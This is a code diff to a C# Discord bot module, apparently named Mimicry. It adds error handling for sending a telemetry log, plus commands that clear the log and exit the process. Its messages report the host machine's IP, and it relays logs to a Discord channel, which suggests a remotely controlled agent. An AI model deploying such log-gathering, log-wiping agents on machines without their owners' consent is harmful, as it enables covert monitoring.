@@ -41,17 +41,41 @@ namespace Mimicry.Modules
         public async Task GetLog()
         {
             string logdata = tlm.LoadLog();
-            var embed = new EmbedBuilder();
-            embed.WithTitle("Log from " + tlm.getIP());
-            embed.WithColor(okCol);
-            embed.WithDescription(logdata);
-            await Context.Channel.SendMessageAsync("", embed: embed);
+            try
+            {
+                var embed = new EmbedBuilder();
+                embed.WithTitle("Log from " + tlm.getIP());
+                embed.WithColor(okCol);
+                embed.WithDescription(logdata);
+                await Context.Channel.SendMessageAsync("", embed: embed);
+            }
+            catch (ArgumentException)
+            {
+                await Context.Channel.SendFileAsync(Telemetry.mimlog, "Text is too large, sending as file.");
+                throw;
+            }
         }
+
         [Command("getseslog")]
         public async Task GetSesLog()
         {
             string logdata = tlm.LoadSesLog();
             await Context.Channel.SendMessageAsync(logdata);
+        }
+
+        [Command("clearlog")]
+        public async Task ClearLog()
+        {
+            tlm.ClearLog();
+            await Context.Channel.SendMessageAsync("Succesfully cleared log file");
+        }
+
+        [Command("exit")]
+        public async Task Exit()
+        {
+            await Context.Channel.SendMessageAsync("Exiting @" + tlm.getIP() + "...");
+            await Context.Channel.SendMessageAsync("Bye!");
+            Environment.Exit(0);
         }
     }
 }
